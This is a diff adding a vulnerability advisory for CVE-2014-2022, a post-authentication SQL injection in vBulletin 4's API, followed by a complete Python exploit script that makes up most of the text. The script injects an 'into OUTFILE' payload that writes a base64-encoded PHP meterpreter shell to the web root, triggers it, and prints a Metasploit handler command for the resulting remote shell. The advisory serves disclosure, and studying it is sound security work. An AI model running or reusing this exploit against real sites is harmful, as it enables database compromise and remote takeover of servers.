@@ -1,0 +1,221 @@
+CVE-2014-2022 - vbulletin 4.x - SQLi in breadcrumbs via xmlrpc API (post-auth)
+==============================================================================
+
+Overview
+--------
+
+	date    :  10/12/2014   
+	cvss    :  7.1 (AV:N/AC:H/Au:S/C:C/I:C/A:C) base
+	cwe     :  89   
+	
+	vendor  : vBulletin Solutions
+	product : vBulletin 4
+	versions affected :  latest 4.x (to date); verified <= 4.2.2
+			* vBulletin 4.2.2     (verified)  
+			* vBulletin 4.2.1     (verified)  
+			* vBulletin 4.2.0 PL2 (verified)  
+						
+	exploitability :
+			* remotely exploitable
+			* requires authentication (apikey)
+				
+	patch availability (to date) :  None
+				
+Abstract
+---------
+ 
+	vBulletin 4 does not properly sanitize parameters to breadcrumbs_create allowing
+	an attacker to inject arbitrary SQL commands (SELECT).
+	
+	risk:  rather low - due to the fact that you the api key is required
+		   you can probably use CVE-2014-2023 to obtain the api key
+
+
+
+Details
+--------
+	
+	vulnerable component: 
+		./includes/api/4/breadcrumbs_create.php
+	vulnerable argument:
+		conceptid
+	
+	which is sanitized as TYPE_STRING which does not prevent SQL injections.
+
+
+Proof of Concept (PoC)
+----------------------
+
+	see https://github.com/tintinweb/pub/tree/master/pocs/cve-2014-2022
+	
+	
+	1) prerequisites
+	1.1) enable API, generate API-key
+		 logon to AdminCP
+		 goto "vBulletin API"->"API-Key" and enable the API interface, generate key
+	2) run PoC
+		 edit PoC to match your TARGET, APIKEY (, optionally DEBUGLEVEL)
+		 provide WWW_DIR which is the place to write the php_shell to (mysql must have permissions for that folder)
+		 Note: meterpreter_bind_tcp is not provided
+		 run PoC, wait for SUCCESS! message
+		 Note: poc will trigger meterpreter shell
+		 
+	meterpreter PoC scenario requires the mysql user to have write permissions 
+	which may not be the case in some default installations.
+	
+	
+Timeline
+--------
+
+	2014-01-14: initial vendor contact, no response
+	2014-02-24: vendor contact, no response
+	2014-10-13: public disclosure
+	
+Contact
+--------
+	tintinweb - https://github.com/tintinweb/pub/tree/master/pocs/cve-2014-2022
+	
+	
+(0x721427D8)
+	
+- - -
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+'''
+@author: tintinweb 0x721427D8
+'''
+import urllib2, cookielib, urllib, json, hashlib
+
+class Exploit(object):
+    
+    baseurl = None
+    cookies = None
+    
+    def __init__(self,baseurl,params, debuglevel=1):
+        self.cookies = cookielib.LWPCookieJar()
+        handlers = [
+                    urllib2.HTTPHandler(debuglevel=debuglevel),
+                    urllib2.HTTPSHandler(debuglevel=debuglevel),
+                    urllib2.HTTPCookieProcessor(self.cookies)
+                    ]
+        self.browser = urllib2.build_opener(*handlers)
+        self.baseurl=baseurl
+        self.params = params
+    
+    def call(self,path="",data={}):
+        assert(isinstance(data,dict))
+        data = urllib.urlencode(data)
+
+        req = urllib2.Request("%s%s"%(self.baseurl,path),data)
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+
+        return self.browser.open(req)
+    
+    def call_json(self,path=None,data={}):
+        try:
+            x=self.call(path,data).read()
+            print "raw_response", x
+            resp =  json.loads(x)
+        except urllib2.HTTPError, he:
+            resp = he.read()
+        return resp
+
+
+    def vb_init_api(self):
+        params = {'api_m':'api_init'}
+        params.update(self.params)
+        data = self.call_json("?%s"%(urllib.urlencode(params)))  
+        self.session = data
+        return data
+    
+    def vb_call(self, params):
+        api_sig = self._vb_build_api_sig(params)
+        req_params = self._vb_build_regstring(api_sig)
+        params.update(req_params)
+        data = self.call_json("?%s"%(urllib.urlencode(params)),data=params)
+        if not isinstance(data, dict):
+            return data
+        if 'errormessage' in data['response'].keys():
+            raise Exception(data)
+        return data
+
+    def _ksort(self, d):
+        ret = []
+        for key, value in [(k,d[k]) for k in sorted(d.keys())]:
+            ret.append( "%s=%s"%(key,value))
+        return "&".join(ret)
+
+    def _ksort_urlencode(self, d):
+        ret = []
+        for key, value in [(k,d[k]) for k in sorted(d.keys())]:
+            ret.append( urllib.urlencode({key:value}))
+        return "&".join(ret)
+
+    def _vb_build_api_sig(self, params):
+        apikey = self.params['apikey']
+        login_string = self._ksort_urlencode(params)
+        access_token = str(self.session['apiaccesstoken'])
+        client_id = str(self.session['apiclientid'])
+        secret = str(self.session['secret'])
+        return hashlib.md5(login_string+access_token+client_id+secret+apikey).hexdigest()
+    
+    def _vb_build_regstring(self, api_sig):
+        params = {
+                  'api_c':self.session['apiclientid'],
+                  'api_s':self.session['apiaccesstoken'],
+                  'api_sig':api_sig,
+                  'api_v':self.session['apiversion'],
+                  }
+        return params
+    
+
+if __name__=="__main__":
+    TARGET = "http://192.168.220.131/vbb4/api.php"
+    APIKEY = "4FAVcRDc"
+    REMOTE_SHELL_PATH = "/var/www/myShell.php"
+    TRIGGER_URL = "http://192.168.220.131/myShell.php"
+    DEBUGLEVEL = 0          # 1 to enable request tracking
+    
+
+    ### 2. sqli - simple - write outfile
+    print "[  2 ] - sqli - inject 'into outfile' to create file xxxxx.php"
+    params = {'clientname':'fancy_exploit_client',
+             'clientversion':'1.0',
+             'platformname':'exploit',
+             'platformversion':'1.5',
+             'uniqueid':'1234',
+             'apikey':APIKEY} 
+    x = Exploit(baseurl=TARGET,params=params)
+    
+    vars = x.vb_init_api()
+    print vars
+    '''
+    x.vb_call(params={'api_m':'breadcrumbs_create',
+                          'type':'t',
+                          #'conceptid':"1 union select 1 into OUTFILE '%s'"%REMOTE_SHELL_PATH,
+                          'conceptid':"1 union select 1 into OUTFILE '%s'"%(REMOTE_SHELL_PATH)
+                          })
+    
+    print "[   *] SUCCESS! - created file %s"%TRIGGER_URL
+    '''
+    ### 3. sqli - put meterpreter shell and trigger it
+    print "[  3 ] - sqli - meterpreter shell + trigger"
+    with open("./meterpreter_bind_tcp") as f:
+        shell = f.read()
+
+    shell = shell.replace("<?php","").replace("?>","")          #cleanup tags
+    shell = shell.encode("base64").replace("\n","")     #encode payload
+    shell = "<?php eval(base64_decode('%s')); ?>"%shell # add decoderstub
+    shell = "0x"+shell.encode("hex")                    # for mysql outfile
+    
+ 
+    x.vb_call(params={'api_m':'breadcrumbs_create',
+                          'type':'t',
+                          'conceptid':"1 union select %s into OUTFILE '%s'"%(shell,REMOTE_SHELL_PATH)})     
+    print "[   *] SUCCESS! - triggering shell .. (script should not exit)"
+    print "[    ] exploit: #>  msfcli multi/handler PAYLOAD=php/meterpreter/bind_tcp LPORT=4444 RHOST=<TARGET_IP> E"
+    print "[   *] shell active ... waiting for it to die ..."
+    print urllib2.urlopen(TRIGGER_URL)   
+    print "[    ] shell died!"
+    print "-- quit --"
